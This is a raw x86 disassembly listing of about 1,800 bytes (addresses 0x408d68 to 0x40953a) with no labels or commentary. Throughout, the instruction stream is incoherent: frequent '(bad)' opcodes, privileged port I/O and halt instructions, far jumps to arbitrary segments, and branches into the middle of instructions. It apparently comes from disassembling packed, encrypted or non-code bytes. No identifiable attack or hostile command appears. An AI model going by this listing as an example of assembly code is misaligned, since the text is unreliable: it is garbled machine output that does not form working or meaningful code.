  408d68:	fcomp  st(1)
  408d6a:	inc    edi
  408d6b:	adc    DWORD PTR [ebx+0x65af0a7e],esp
  408d71:	je     0x408dee
  408d73:	add    edx,DWORD PTR [esi-0x72]
  408d76:	jno    0x408df7
  408d78:	imul   BYTE PTR [esi+eiz*1]
  408d7b:	std    
  408d7c:	scas   eax,DWORD PTR es:[edi]
  408d7d:	daa    
  408d7e:	cmp    al,0x22
  408d80:	and    edi,DWORD PTR [esi+0x40bde3af]
  408d86:	pop    edx
  408d87:	in     eax,dx
  408d88:	mov    bl,0x4b
  408d8a:	inc    eax
  408d8b:	and    eax,0x7ad4bc19
  408d90:	addr16 inc ecx
  408d92:	pop    edx
  408d93:	mov    eax,0x660bf548
  408d98:	or     al,0x39
  408d9a:	out    dx,eax
  408d9b:	stos   DWORD PTR es:[edi],eax
  408d9c:	and    eax,edx
  408d9e:	cmp    ebp,esi
  408da0:	sbb    DWORD PTR [eax-0x50],eax
  408da3:	add    al,BYTE PTR [esi-0x5db0cde9]
  408da9:	(bad)  
  408daa:	push   DWORD PTR [eax+0x2388589d]
  408db0:	int    0x6
  408db2:	mov    esp,0x6793a708
  408db7:	mov    bl,0x9d
  408db9:	outs   dx,BYTE PTR ds:[esi]
  408dba:	push   0xba5c2ce8
  408dbf:	ja     0x408dfe
  408dc1:	mov    eax,0x9e20af82
  408dc6:	jnp    0x408dc6
  408dc8:	dec    esp
  408dc9:	cmp    ebp,DWORD PTR [ecx+0x5f]
  408dcc:	cli    
  408dcd:	inc    edi
  408dce:	retf   
  408dcf:	mov    al,0xfa
  408dd1:	loop   0x408e35
  408dd3:	pop    es
  408dd4:	dec    edi
  408dd5:	or     DWORD PTR [edx],esi
  408dd7:	rol    DWORD PTR es:[edi-0x6c56a0fb],cl
  408dde:	fld    TBYTE PTR [edi-0x4474dd7e]
  408de4:	rol    DWORD PTR [esi],cl
  408de6:	mov    edi,0x2366df60
  408deb:	(bad)  
  408dec:	fs or  al,0x95
  408def:	and    DWORD PTR [ebx+esi*1+0x5bf4a74c],ecx
  408df6:	les    edi,FWORD PTR [edi+0x5bfc90db]
  408dfc:	or     al,0xd0
  408dfe:	jmp    0x2d59:0x596c138b
  408e05:	add    ebp,DWORD PTR [edi-0x65a4a011]
  408e0b:	inc    edi
  408e0c:	mov    ch,0xc0
  408e0e:	push   ebp
  408e0f:	xchg   esi,eax
  408e10:	sub    BYTE PTR [edi],ah
  408e12:	add    eax,0x12c2f9bb
  408e17:	push   esi
  408e18:	mov    ecx,0xd37c349
  408e1d:	popf   
  408e1e:	pop    ebx
  408e1f:	push   esi
  408e20:	mov    al,ds:0x21c0ec3c
  408e25:	adc    eax,0x103ec0eb
  408e2a:	sub    ebp,DWORD PTR [eax]
  408e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e2d:	jmp    0x408dd4
  408e2f:	es js  0x408e05
  408e32:	fdiv   st(2),st
  408e34:	enter  0x3754,0xc8
  408e38:	push   es
  408e39:	cs jbe 0x408e8f
  408e3c:	lods   eax,DWORD PTR ds:[esi]
  408e3d:	mov    esi,0x673d6cb1
  408e42:	xor    DWORD PTR [ebp-0x7a],ecx
  408e45:	xchg   ebp,eax
  408e46:	add    eax,0x437e94c1
  408e4b:	pop    ebp
  408e4c:	hlt    
  408e4d:	test   eax,0xd6272ef7
  408e52:	enter  0x5e1e,0xd9
  408e56:	cmp    ebp,DWORD PTR [edi-0x5b]
  408e59:	or     edx,ebp
  408e5b:	(bad)  
  408e5c:	mov    edx,0xcd9be208
  408e61:	cmp    ah,BYTE PTR [edx-0x34a9d10]
  408e67:	pop    ds
  408e68:	push   es
  408e69:	add    DWORD PTR [ecx+0x5f],ebx
  408e6c:	scas   eax,DWORD PTR es:[edi]
  408e6d:	jb     0x408e5d
  408e6f:	call   0xac24:0xe65cc2fb
  408e76:	daa    
  408e77:	mov    ebp,0x6ef747c2
  408e7c:	sahf   
  408e7d:	adc    bl,al
  408e7f:	adc    bh,BYTE PTR [edx+0x54c87174]
  408e85:	ja     0x408eaa
  408e87:	push   esp
  408e88:	adc    eax,0x24d69465
  408e8d:	leave  
  408e8e:	call   0x553e56d8
  408e93:	add    DWORD PTR [edx+0x3c56872b],eax
  408e99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9b:	add    cl,dl
  408e9d:	pop    edi
  408e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e9f:	inc    edi
  408ea0:	dec    esp
  408ea1:	dec    esi
  408ea2:	retf   0xeabb
  408ea5:	(bad)
  408ea8:	mov    ds:0xa89ce668,eax
  408ead:	repz adc edx,DWORD PTR [edi]
  408eb0:	mov    ecx,0xc20f833f
  408eb5:	adc    DWORD PTR [edx],esi
  408eb7:	aad    0x85
  408eb9:	out    dx,al
  408eba:	in     al,dx
  408ebb:	xchg   esi,eax
  408ebc:	(bad)  
  408ebd:	sub    al,0xda
  408ebf:	pop    ss
  408ec0:	jo     0x408ef9
  408ec2:	xchg   DWORD PTR [edi-0xe4e01bc],eax
  408ec8:	mov    edx,0x68abfaa9
  408ecd:	push   eax
  408ece:	inc    ebp
  408ecf:	pop    esi
  408ed0:	mov    al,0x84
  408ed2:	push   esi
  408ed3:	dec    ebx
  408ed4:	add    al,0xd1
  408ed6:	iret   
  408ed7:	aad    0xbd
  408ed9:	inc    eax
  408eda:	out    dx,al
  408edb:	movntps XMMWORD PTR [eax+0x1e],xmm5
  408edf:	inc    esi
  408ee0:	sub    BYTE PTR [eax],dh
  408ee2:	inc    esi
  408ee3:	xlat   BYTE PTR ds:[ebx]
  408ee4:	test   al,0x49
  408ee7:	out    0xfc,eax
  408ee9:	mov    edi,0x5b98376d
  408eee:	mov    esi,0xe75b70f3
  408ef3:	daa    
  408ef4:	(bad)  
  408ef5:	sbb    cl,BYTE PTR [bp+si]
  408ef8:	adc    esi,edx
  408efa:	scas   al,BYTE PTR es:[edi]
  408efb:	sahf   
  408efc:	aad    0xe8
  408efe:	pop    edi
  408eff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f00:	add    eax,0x146f0e2a
  408f05:	dec    eax
  408f06:	xor    bl,BYTE PTR [edx]
  408f08:	fisttp QWORD PTR [edi+0x7d]
  408f0b:	inc    ebp
  408f0c:	sub    eax,0xe03519b9
  408f11:	stc    
  408f12:	adc    eax,0x18dd3884
  408f17:	mov    BYTE PTR ds:0x2ceb11a2,0x1b
  408f1e:	in     al,dx
  408f1f:	dec    eax
  408f20:	jmp    0xc4f3:0x4782106b
  408f27:	xchg   edi,eax
  408f28:	adc    eax,0x1cd9744c
  408f2d:	je     0x408f38
  408f2f:	jl     0x408f2c
  408f31:	pushf  
  408f32:	mov    bh,0x2b
  408f34:	mov    bl,0x6a
  408f36:	cmc    
  408f37:	outs   dx,DWORD PTR ds:[esi]
  408f38:	int    0x9d
  408f3a:	mov    cl,0xa4
  408f3c:	xor    eax,0x8491e244
  408f41:	fbld   TBYTE PTR [esi-0x54]
  408f44:	adc    BYTE PTR [ebp+0x1d],bl
  408f47:	xor    eax,0x56ac045
  408f4c:	jbe    0x408f3d
  408f4e:	imul   ebp,eax,0x81eb4283
  408f54:	lea    ecx,[esi+eax*2-0x13]
  408f58:	aaa    
  408f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f5a:	or     cl,BYTE PTR [eax+edi*1]
  408f5d:	out    0xb,al
  408f5f:	aam    0xce
  408f61:	sbb    DWORD PTR [edx+0x1cdd8b0c],ebx
  408f67:	hlt    
  408f68:	out    0x75,eax
  408f6a:	repz inc ebx
  408f6c:	je     0x408f4d
  408f6e:	adc    BYTE PTR [eax-0x10],cl
  408f71:	xchg   edi,eax
  408f72:	mov    WORD PTR [edx-0x72ac6bd1],?
  408f78:	je     0x408fbd
  408f7a:	lahf   
  408f7b:	cdq    
  408f7c:	add    DWORD PTR [ecx-0x75cdaa84],ebp
  408f82:	dec    ebx
  408f83:	mov    al,ds:0x6f60d9b5
  408f88:	icebp  
  408f89:	fnsave [esi-0x2e11a2b4]
  408f8f:	and    DWORD PTR [esi-0x39],edi
  408f92:	push   ecx
  408f93:	imul   esp,DWORD PTR [eax-0x2847c961],0xfffffff9
  408f9a:	sub    edi,DWORD PTR [edi-0x57]
  408f9d:	pop    ss
  408f9e:	or     al,0x6b
  408fa0:	jle    0x408fbe
  408fa2:	or     bl,BYTE PTR [edx]
  408fa4:	mov    eax,ds:0x33793f1
  408fa9:	xchg   ecx,eax
  408faa:	test   BYTE PTR es:[esi+0x6],al
  408fae:	sar    DWORD PTR ds:0x5dce24af,cl
  408fb4:	nop
  408fb5:	hlt    
  408fb6:	call   0x24f345be
  408fbb:	int    0x8d
  408fbd:	jo     0x408f97
  408fbf:	addr16 cmc 
  408fc1:	hlt    
  408fc2:	in     al,dx
  408fc3:	mov    dh,0xf3
  408fc5:	stos   DWORD PTR es:[edi],eax
  408fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fc7:	adc    eax,0x6d071f0f
  408fcc:	repnz sub eax,0xe03c13ae
  408fd2:	imul   esi,DWORD PTR [ebp-0x35738085],0xe109218f
  408fdc:	jne    0x408f86
  408fde:	loope  0x409027
  408fe0:	mov    edi,0x6e02344a
  408fe5:	stc    
  408fe6:	mov    cl,BYTE PTR [edi-0x7e]
  408fe9:	cmp    eax,0xc644bb07
  408fee:	dec    ebx
  408fef:	jnp    0x409027
  408ff1:	push   eax
  408ff2:	ins    BYTE PTR es:[edi],dx
  408ff3:	cwde   
  408ff4:	ficomp WORD PTR [ebp-0x2a2cbcbb]
  408ffa:	mov    WORD PTR [esi+edx*2+0x9],ss
  408ffe:	cmc    
  408fff:	in     al,0xdc
  409001:	xchg   BYTE PTR [eax+0x42],ch
  409004:	inc    edx
  409005:	loopne 0x409003
  409007:	retf   
  409008:	jns    0x408ff9
  40900a:	push   ss
  40900b:	out    0xc8,al
  40900d:	rcr    edx,0xef
  409010:	add    BYTE PTR [edi],cl
  409012:	pop    esi
  409013:	jb     0x408fb0
  409015:	loop   0x408fcb
  409017:	adc    edx,DWORD PTR [edi+0x68]
  40901a:	jmp    0x9927c9a6
  40901f:	sti    
  409020:	mov    dl,0x44
  409022:	repz ret 
  409024:	mov    esi,0xe2817b6a
  409029:	dec    ebp
  40902a:	pop    ss
  40902b:	int3   
  40902c:	dec    ebx
  40902d:	inc    ebx
  40902e:	shr    DWORD PTR [edi+ecx*2-0x5a],1
  409032:	mov    ds:0xdd35afb1,al
  409037:	cmp    ebp,DWORD PTR [edi]
  409039:	xlat   BYTE PTR ds:[ebx]
  40903a:	cmc    
  40903b:	out    dx,al
  40903c:	jl     0x408ff2
  40903e:	test   al,0xb4
  409040:	repz xor ch,BYTE PTR [ebp-0x70dd150d]
  409047:	add    DWORD PTR [esi+0x408b9638],esi
  40904d:	jmp    DWORD PTR [esi-0x7b]
  409050:	inc    eax
  409051:	fsubr  DWORD PTR [edx-0x5a54204b]
  409057:	mov    ah,0x11
  409059:	xor    BYTE PTR [ecx-0x2c],cl
  40905c:	int    0xa
  40905e:	jl     0x40905a
  409060:	mov    ecx,ebp
  409062:	pop    ebp
  409063:	sub    edi,DWORD PTR [eax]
  409065:	sub    BYTE PTR [edi],ah
  409067:	ror    BYTE PTR [eax],cl
  409069:	adc    ch,BYTE PTR [edx+0x3c]
  40906c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40906e:	aas    
  40906f:	shl    BYTE PTR [edx+0xd53b9e5],0xf6
  409076:	mov    edx,0xd9e3eaef
  40907b:	jb     0x409054
  40907d:	test   ch,dl
  40907f:	mov    ebx,0xa61a88f7
  409084:	ret    0xbc55
  409087:	aas    
  409088:	ins    DWORD PTR es:[edi],dx
  409089:	xchg   edx,eax
  40908a:	addr16 ret 
  40908c:	fisttp DWORD PTR [ebx+0x3f]
  40908f:	xchg   edx,eax
  409090:	push   0xdd8ec872
  409095:	jns    0x409050
  409097:	ja     0x409081
  409099:	call   0x897d:0x787b3321
  4090a0:	in     eax,dx
  4090a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090a2:	in     eax,0x75
  4090a4:	mov    DWORD PTR [ebp+0x2],0x7d2e2728
  4090ab:	ret    0x8d66
  4090ae:	adc    al,0xd4
  4090b0:	xor    al,ah
  4090b2:	jne    0x409077
  4090b4:	(bad)  
  4090b5:	jae    0x4090db
  4090b7:	sub    edi,DWORD PTR [esi-0x61]
  4090ba:	repz or edx,DWORD PTR [edi+0x475b8bfc]
  4090c1:	loopne 0x40907a
  4090c3:	push   esp
  4090c4:	push   edx
  4090c5:	adc    eax,0xb3e9f40d
  4090ca:	fist   DWORD PTR [edi]
  4090cc:	sbb    DWORD PTR [esi+ebx*2-0x3eea0e6a],esp
  4090d3:	enter  0x7f37,0xb3
  4090d7:	mov    ebx,0x5497dd86
  4090dc:	pusha  
  4090dd:	(bad)  
  4090de:	fist   WORD PTR [ebp+0xa3816e4]
  4090e4:	adc    DWORD PTR [esi+0x46],esp
  4090e7:	cmp    DWORD PTR [esi],ecx
  4090e9:	xchg   esp,eax
  4090ea:	lods   eax,DWORD PTR ds:[esi]
  4090eb:	sub    al,0x1e
  4090ed:	push   cs
  4090ee:	xor    al,0xfa
  4090f0:	popf   
  4090f1:	mov    BYTE PTR [ebx-0x8],ch
  4090f4:	test   BYTE PTR [edi-0x53df609],bl
  4090fa:	sbb    al,0xf
  4090fc:	mov    ch,0x3e
  4090fe:	sbb    edi,DWORD PTR [ebx-0x5c]
  409101:	in     al,dx
  409102:	jmp    0x9dec:0xbdc42ef3
  409109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40910a:	fild   QWORD PTR [ecx-0x73]
  40910d:	push   0xb4ca08a0
  409112:	add    al,0x2e
  409114:	dec    ebx
  409115:	or     edx,DWORD PTR [eax]
  409117:	push   esp
  409118:	or     ch,BYTE PTR [ecx-0x4ef7629b]
  40911e:	jecxz  0x409111
  409120:	jge    0x4090c5
  409122:	adc    al,0x43
  409124:	push   ecx
  409125:	shr    DWORD PTR [edi+0x29],cl
  409128:	(bad)  
  409129:	ficomp DWORD PTR [ebp-0x684f72d7]
  40912f:	ins    DWORD PTR es:[edi],dx
  409130:	test   al,0xd7
  409132:	mov    bl,al
  409134:	fst    QWORD PTR [esi+0x3b]
  409137:	jb     0x4090d1
  409139:	into   
  40913a:	shl    DWORD PTR [esi],cl
  40913c:	xor    al,0xea
  40913e:	sahf   
  40913f:	cwde   
  409140:	and    BYTE PTR [edi+0x3d3a9020],ah
  409146:	daa    
  409147:	and    DWORD PTR [edi-0x8],ebp
  40914a:	push   ebx
  40914b:	icebp  
  40914c:	mov    ecx,0xf247cea3
  409151:	mov    ebx,0xab98f044
  409156:	leave  
  409157:	lds    ebp,FWORD PTR [eax+0x175810aa]
  40915d:	rcl    esi,1
  40915f:	push   edx
  409160:	fs enter 0x422f,0x9b
  409165:	arpl   WORD PTR [ebp+0x18],ax
  409168:	loop   0x40912e
  40916a:	sbb    eax,0xccee5aaa
  40916f:	(bad)  
  409170:	push   esp
  409171:	xchg   ebx,eax
  409172:	or     DWORD PTR [ebp*8+0x7a773633],edi
  409179:	xchg   ebp,eax
  40917a:	inc    ecx
  40917b:	js     0x409176
  40917d:	mov    ecx,DWORD PTR [edi+0x5a502992]
  409183:	mov    eax,0x5ea9c70e
  409188:	inc    esp
  409189:	xchg   BYTE PTR [edi-0x7325a31f],bl
  40918f:	or     bh,0x7a
  409192:	outs   dx,DWORD PTR ds:[esi]
  409193:	mov    ebp,0xa2f18ce
  409198:	loopne 0x4091fd
  40919a:	sbb    eax,0x61b7f43f
  40919f:	adc    BYTE PTR [ebp+0x6e97486a],dl
  4091a5:	dec    ebp
  4091a6:	repz mov eax,ds:0xc39b70c5
  4091ac:	mov    cl,0xd8
  4091ae:	arpl   WORD PTR [edi-0x2b],sp
  4091b1:	push   edx
  4091b2:	sub    al,dh
  4091b4:	into   
  4091b5:	into   
  4091b6:	(bad)  
  4091b7:	shl    DWORD PTR [esi-0x74],1
  4091ba:	jns    0x40919f
  4091bc:	clc    
  4091bd:	cwde   
  4091be:	push   cs
  4091bf:	inc    eax
  4091c0:	and    esi,0x468ce490
  4091c6:	loop   0x40918f
  4091c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091c9:	add    al,bl
  4091cb:	outs   dx,BYTE PTR ds:[esi]
  4091cc:	out    0x39,al
  4091ce:	mov    BYTE PTR [ebx+0x69],ch
  4091d1:	jns    0x4091bd
  4091d3:	jno    0x409238
  4091d5:	mov    ch,0x6
  4091d7:	mov    edi,0x479d5143
  4091dc:	mov    esi,0x635d4323
  4091e1:	dec    ebx
  4091e2:	dec    ecx
  4091e3:	out    0x54,eax
  4091e5:	pop    edi
  4091e6:	cmp    BYTE PTR [eax-0x7c],dl
  4091e9:	cmc    
  4091ea:	pop    edx
  4091eb:	test   DWORD PTR [eax-0x18],ebp
  4091ee:	fist   WORD PTR [edi]
  4091f0:	iret   
  4091f1:	scas   al,BYTE PTR es:[edi]
  4091f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091f3:	faddp  st(3),st
  4091f5:	push   0x4fc9d5b0
  4091fa:	icebp  
  4091fb:	cmp    eax,0x8da0b5
  409200:	stos   DWORD PTR es:[edi],eax
  409201:	aas    
  409202:	fdivr  QWORD PTR [edx]
  409204:	les    edx,FWORD PTR [ebp+0x76]
  409207:	xor    eax,0xdeaa87b5
  40920c:	pop    eax
  40920d:	lea    esp,[ecx-0x4f51f98d]
  409213:	jge    0x409233
  409215:	bound  edx,QWORD PTR [ecx+ebp*4-0x48]
  409219:	rol    bh,0x2d
  40921c:	jmp    0x4091e2
  40921e:	pop    ebp
  40921f:	jnp    0x40924a
  409221:	push   ss
  409222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409223:	inc    ebx
  409224:	lea    eax,[edx+esi*8]
  409227:	sbb    esi,ebp
  409229:	mov    cl,0x70
  40922b:	leave  
  40922c:	popf   
  40922d:	jne    0x409272
  40922f:	mov    cl,ah
  409231:	loope  0x4091cd
  409233:	push   edi
  409234:	xchg   edi,eax
  409235:	mov    edi,0x330864bf
  40923a:	loop   0x409231
  40923c:	loop   0x4092a8
  40923e:	xchg   edx,eax
  40923f:	jae    0x409276
  409241:	jbe    0x409218
  409243:	rcr    BYTE PTR [esp+ebx*2],0xc
  409247:	(bad)  [ebp-0x497192e3]
  40924d:	fistp  WORD PTR [ebp-0x6746a0dd]
  409253:	push   eax
  409254:	sahf   
  409255:	repnz xor al,0xd9
  409258:	jl     0x4092a4
  40925a:	or     DWORD PTR [ebx],ebp
  40925c:	mov    cl,0x4e
  40925e:	das    
  40925f:	add    eax,DWORD PTR [edx]
  409261:	pop    es
  409262:	les    ebp,FWORD PTR [ebx-0x48c40237]
  409268:	mov    ch,0xab
  40926a:	and    BYTE PTR [edx-0x459228e3],bl
  409270:	jg     0x4092c5
  409272:	lock (bad) 
  409275:	or     BYTE PTR [ebp-0x8],dl
  409278:	cwde   
  409279:	or     edx,DWORD PTR [esi-0x27e6f212]
  40927f:	or     BYTE PTR [eax-0x1f6e9121],bl
  409285:	test   eax,0xd79b971d
  40928a:	sub    DWORD PTR [esi],esi
  40928c:	pusha  
  40928d:	lods   eax,DWORD PTR ds:[esi]
  40928e:	jmp    0x4092d1
  409290:	sets   bl
  409293:	out    dx,al
  409294:	cdq    
  409295:	(bad)  
  409296:	(bad)  
  409298:	sub    DWORD PTR ds:0x8f32033c,ecx
  40929e:	outs   dx,DWORD PTR ds:[esi]
  40929f:	ror    edx,cl
  4092a1:	mov    DWORD PTR [esi],ebx
  4092a3:	dec    esi
  4092a4:	cs loope 0x4092de
  4092a7:	test   DWORD PTR [eax+0x30c3f43e],ebx
  4092ad:	outs   dx,DWORD PTR ds:[esi]
  4092ae:	push   ebx
  4092af:	int3   
  4092b0:	fstp   DWORD PTR [ecx]
  4092b2:	push   eax
  4092b3:	jge    0x409327
  4092b5:	fnstcw WORD PTR [esi]
  4092b7:	xchg   cl,al
  4092b9:	stos   BYTE PTR es:[edi],al
  4092ba:	xchg   esp,eax
  4092bb:	adc    BYTE PTR [edx],dl
  4092bd:	xchg   edx,eax
  4092be:	pop    esp
  4092bf:	icebp  
  4092c0:	sub    al,0xd0
  4092c2:	jmp    0xefeb:0x75b5dcab
  4092c9:	and    eax,DWORD PTR [esi]
  4092cb:	das    
  4092cc:	in     eax,0x79
  4092ce:	out    dx,al
  4092cf:	xchg   ebp,eax
  4092d0:	mov    BYTE PTR [ebp+ecx*4-0x7948fc68],bh
  4092d7:	cmp    ebx,0x96257cfa
  4092dd:	add    al,0xc
  4092df:	push   edi
  4092e0:	lods   eax,DWORD PTR ds:[esi]
  4092e1:	xlat   BYTE PTR ds:[ebx]
  4092e2:	pop    esp
  4092e3:	add    ch,BYTE PTR [edx-0x97c50e1]
  4092e9:	nop
  4092ea:	imul   esp,esp,0x6a
  4092ed:	nop
  4092ee:	mov    ebp,0x6c77baad
  4092f3:	into   
  4092f4:	mov    WORD PTR [esi-0x34],es
  4092f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092f8:	push   ss
  4092f9:	dec    ebx
  4092fa:	cmp    ch,BYTE PTR ds:0xb0506c38
  409300:	xchg   esp,eax
  409301:	scas   al,BYTE PTR es:[edi]
  409302:	mov    ecx,0x236e4bb2
  409307:	and    bl,BYTE PTR [ecx+0xc]
  40930a:	out    dx,eax
  40930b:	stos   BYTE PTR es:[edi],al
  40930c:	jmp    0x1eb957ba
  409311:	clc    
  409312:	xor    dl,al
  409314:	test   al,0xb0
  409316:	sub    bl,BYTE PTR ds:0x4abf36b5
  40931c:	fiadd  WORD PTR [edi]
  40931e:	adc    al,0x62
  409320:	sbb    eax,0x6824c138
  409325:	sub    DWORD PTR [ebp-0x1f674da4],eax
  40932b:	out    dx,eax
  40932c:	push   ss
  40932d:	enter  0x4723,0x7e
  409331:	mov    DWORD PTR [ebp+0x2b32ebc8],ecx
  409337:	and    BYTE PTR [eax+0x1],ch
  40933a:	mov    esp,0xe50dbe6c
  40933f:	shr    BYTE PTR [ebx+0x2b],0x9
  409343:	cmp    al,0xed
  409345:	inc    edi
  409346:	les    edi,FWORD PTR [ecx]
  409348:	ins    BYTE PTR es:[edi],dx
  409349:	das    
  40934a:	sub    al,0xc9
  40934c:	mov    esp,0xca039493
  409351:	clc    
  409352:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409353:	dec    edx
  409354:	xchg   esi,eax
  409355:	gs out 0xdb,eax
  409358:	pushf  
  409359:	stos   DWORD PTR es:[edi],eax
  40935a:	dec    ebp
  40935b:	cwde   
  40935c:	pop    ebx
  40935d:	in     al,0x93
  40935f:	int    0x7f
  409361:	mov    eax,fs:0x66c1c941
  409367:	ret    0x4cdb
  40936a:	stc    
  40936b:	je     0x4093d1
  40936d:	cwd    
  40936f:	sbb    esi,DWORD PTR [edi]
  409371:	sbb    BYTE PTR [esp+ecx*4-0x6f1b7ba3],dl
  409378:	add    al,0x48
  40937a:	out    0x8e,al
  40937c:	mov    ch,0x44
  40937e:	pop    eax
  40937f:	jo     0x4093e3
  409381:	cmp    al,0xc4
  409383:	adc    eax,0x38400a77
  409388:	sub    esp,edi
  40938a:	into   
  40938b:	retf   
  40938c:	rol    edx,cl
  40938e:	fsub   DWORD PTR [edi-0x2b]
  409391:	mov    ebp,0x90e07fb
  409396:	mov    ch,0xd1
  409398:	mov    BYTE PTR [edx+edx*4-0x47],cl
  40939c:	ret    0xb002
  40939f:	dec    ebx
  4093a0:	xchg   edi,eax
  4093a1:	cmp    BYTE PTR [ecx-0x7],dh
  4093a4:	scas   al,BYTE PTR es:[edi]
  4093a5:	xchg   esi,eax
  4093a6:	inc    edi
  4093a7:	or     BYTE PTR [ebp-0x37a8f1f1],ah
  4093ad:	mov    dl,0x9d
  4093af:	mov    DWORD PTR cs:[ebx-0x5892f31d],eax
  4093b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093b7:	std    
  4093b8:	and    dh,ch
  4093ba:	in     eax,0xb4
  4093bc:	sbb    BYTE PTR [ecx],bl
  4093be:	xchg   edx,eax
  4093bf:	mov    ds:0x3f0a3f13,eax
  4093c4:	icebp  
  4093c5:	mov    ah,0xa6
  4093c7:	sub    eax,0xc87107c5
  4093cc:	pop    edx
  4093cd:	in     al,dx
  4093ce:	adc    al,dl
  4093d0:	add    edi,DWORD PTR [edx-0x7b]
  4093d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093d4:	inc    ebx
  4093d5:	cwde   
  4093d6:	jmp    0x276b:0x7310b7cb
  4093dd:	call   0x2b47d17c
  4093e2:	push   ebp
  4093e3:	jge    0x409460
  4093e5:	retf   0x7bb1
  4093e8:	sar    DWORD PTR [esi],cl
  4093ea:	retf   0xef83
  4093ed:	cmp    eax,0x538f7ec8
  4093f2:	fistp  DWORD PTR [esi]
  4093f4:	push   edi
  4093f5:	mov    eax,0x90e81eb5
  4093fa:	push   eax
  4093fb:	inc    esp
  4093fc:	jg     0x409409
  4093fe:	rcl    DWORD PTR [edx+0x21feba2e],cl
  409404:	push   DWORD PTR [edi-0x16d5cea6]
  40940a:	jle    0x40946a
  40940c:	mov    edi,0xfaab926
  409411:	stos   BYTE PTR es:[edi],al
  409412:	inc    ebx
  409413:	sub    bl,bh
  409415:	ffree  st(4)
  409417:	into   
  409418:	sbb    DWORD PTR [edi],0x71da66bc
  40941e:	xchg   esi,eax
  40941f:	rcr    DWORD PTR [esi+0x3320e5cc],1
  409425:	sahf   
  409426:	in     al,0x38
  409428:	sub    BYTE PTR [esi+esi*1],0x43
  40942c:	loope  0x4094a2
  40942e:	inc    ebx
  40942f:	fdiv   st,st(6)
  409431:	adc    BYTE PTR ds:0xbeea4018,0x3e
  409438:	sbb    eax,ebx
  40943a:	sbb    dh,BYTE PTR [edi+esi*8]
  40943d:	scas   al,BYTE PTR es:[edi]
  40943e:	loop   0x40948f
  409440:	xchg   esp,eax
  409441:	mov    bh,0x24
  409443:	pop    ecx
  409444:	aad    0xdc
  409446:	ret    0x1589
  409449:	sub    BYTE PTR [eax-0x34],0x90
  40944d:	ss lock sbb edi,edx
  409451:	cmp    al,0x75
  409453:	jb     0x40940b
  409455:	xor    ah,cl
  409457:	enter  0xd018,0xa5
  40945b:	outs   dx,BYTE PTR ds:[esi]
  40945c:	or     DWORD PTR [ebp+0x5ec2fb85],0x2d
  409463:	jmp    0x40945a
  409465:	jmp    0x4638:0x66e12019
  40946c:	(bad)  
  40946d:	mov    eax,edx
  40946f:	outs   dx,DWORD PTR ds:[esi]
  409470:	dec    eax
  409471:	cmp    eax,0x41b72726
  409476:	mov    ebp,DWORD PTR [edi-0x34]
  409479:	scas   al,BYTE PTR es:[edi]
  40947a:	rsqrtps xmm0,xmm2
  40947d:	(bad)  
  40947e:	xchg   edx,eax
  40947f:	jp     0x4094a0
  409481:	mov    dh,0x2f
  409483:	adc    eax,0x146b2a6b
  409488:	add    ah,BYTE PTR [edi-0x3f80cfaf]
  40948e:	pop    eax
  40948f:	fldenv fs:[edx+0x5a53d225]
  409496:	les    ebp,FWORD PTR [edx]
  409498:	push   edx
  409499:	(bad)  
  40949b:	mov    cl,0xbf
  40949d:	jne    0x40949b
  40949f:	pop    eax
  4094a0:	dec    ebx
  4094a1:	mov    al,0xe2
  4094a3:	mov    ebp,0x6e2333c9
  4094a8:	inc    esi
  4094a9:	xor    BYTE PTR [ecx+0x79],bh
  4094ac:	imul   esp,DWORD PTR [ebp-0x47],0xd56ed4e7
  4094b3:	inc    ebx
  4094b4:	jl     0x40952e
  4094b6:	add    DWORD PTR cs:0x42c836e0,0x59
  4094be:	add    DWORD PTR [ebx+0x4657b029],0xa613886d
  4094c8:	ja     0x4094a8
  4094ca:	lods   eax,DWORD PTR ds:[esi]
  4094cb:	cli    
  4094cc:	adc    cl,al
  4094ce:	out    dx,al
  4094cf:	leave  
  4094d0:	and    al,0x7f
  4094d2:	lods   al,BYTE PTR ds:[esi]
  4094d3:	cmp    esp,ebx
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	and    eax,0x11c7eac1
  4094db:	jecxz  0x409547
  4094dd:	sti    
  4094de:	ret    
  4094df:	ret    
  4094e0:	jmp    0xe19c2dfb
  4094e5:	dec    eax
  4094e6:	jmp    0x4c54:0x2871b23e
  4094ed:	xchg   esp,eax
  4094ee:	mov    eax,ds:0x7f9a9d30
  4094f3:	inc    eax
  4094f4:	xchg   edx,ebx
  4094f6:	mov    eax,ds:0x5485505b
  4094fb:	(bad)  
  4094fc:	repz repz (bad) 
  4094ff:	pop    edi
  409500:	test   al,0x80
  409502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409503:	or     BYTE PTR [eax+0x23],bl
  409506:	jae    0x4094c3
  409508:	in     eax,dx
  409509:	loop   0x409553
  40950b:	mov    ah,0xc4
  40950d:	retf   
  40950e:	lds    eax,FWORD PTR [esi+0x1295d148]
  409514:	jl     0x4094f1
  409516:	nop
  409517:	outs   dx,BYTE PTR ds:[esi]
  409518:	and    ebp,DWORD PTR [eiz*4+0x1c6891e2]
  40951f:	retf   0x884f
  409522:	adc    BYTE PTR [ecx+0x1d],dh
  409525:	mov    bl,0xfd
  409527:	mov    bl,0x1e
  409529:	mov    esp,0xae92d372
  40952e:	fidivr WORD PTR [edi-0x578ae878]
  409534:	inc    edi
  409535:	ret    0xcf51
  409538:	xchg   eax,esp
  40953a:	mul    DWORD PTR [eax-0x3a]
